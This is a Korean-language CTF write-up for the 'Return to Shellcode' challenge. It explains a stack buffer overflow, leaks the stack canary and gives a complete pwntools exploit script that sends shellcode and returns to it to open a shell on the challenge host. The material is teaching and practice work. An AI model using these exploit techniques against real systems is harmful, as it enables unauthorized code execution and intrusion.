Return to Shellcode 라이트업
===================

<img width="587" height="266" alt="image" src="https://github.com/user-attachments/assets/afd97a65-b219-4add-ba97-f085270dcf9d" />

checksec을 이용해 보호기법을 먼저 파악해볼 수 있다.

### 취약점 탐색

#### 1. buf의 주소

```c
printf("Address of the buf: %p\n", buf);
printf("Distance between buf and $rbp: %ld\n",
        (char*)__builtin_frame_address(0) - buf);
```

#### 2. 스택 버퍼 오버플로우

```c
char buf[0x50];

read(0, buf, 0x100);   // 0x50 < 0x100
gets(buf);             // Unsafe function
```

코드를 보면 스택 버퍼인 buf에 총 두 번의 입력을 받는데 두 입력 모두에서 오버플로우가 발생한다는 것을 알 수 있다.


### 익스플로잇 시나리오

#### 1. 버퍼 주소 획득

프로세스가 시작되면 출력되는 Address of the buf:  메시지를 파싱하여 스택 버퍼(buf)의 주소 값을 얻을 수 있다. 이 주소는 페이로드의 반환값으로 사용할 수 있다.

#### 2. 스택 카나리 값 leak

* buf 값 80 + 카나리는 항상 맨 앞에 null이 포함된 8바이트 값
* read 함수의 입력값으로 89바이트를 입력하면 카나리 값의 맨 앞 부분인 null이 제거되면서 카나리 값을 출력


#### 3. 페이로드 전송 및 셸 획득

**페이로드 구성**
* 셸코드 + 패딩
* 카나리 값: 유출된 카나리 값을 그대로 넣어 카나리 검사를 우회
* EBP/RBP: 카나리 뒤에 위치한 스택 프레임 포인터(RBP)를 덮어쓰기 위해 8바이트 더미 값을 추가
* 리턴 주소: 마지막으로 buf의 시작 주소를 넣어서 함수가 종료될 때 셸코드로 실행 흐름이 이동하도록 만들기


### 익스플로잇 코드

```python
from pwn import *

def slog(name, addr):
  return success(": ".join([name, hex(addr)]))

context.arch = "amd64"
p = remote("host8.dreamhack.games", 13812)

p.recvuntil("Address of the buf: ")
buf = int(p.recv(14), 16)

print("buf: " + hex(buf))

payload = b"A"*0x59
p.sendafter("Input: ", payload)
p.recvuntil(payload)
canary = u64(b"\x00"+p.recv(7))

print("Canary: " + hex(canary))

shellcode = asm(shellcraft.sh())

payload = shellcode.ljust(0x58, b"A") + p64(canary) + b"B"*0x8 + p64(buf)

p.sendlineafter("Input: ", payload)
p.interactive()
```



### 실행 결과


<img width="587" height="142" alt="image" src="https://github.com/user-attachments/assets/6583a515-fbdf-4a2b-b910-b60d3df1035a" />

플래그 획득 확인 
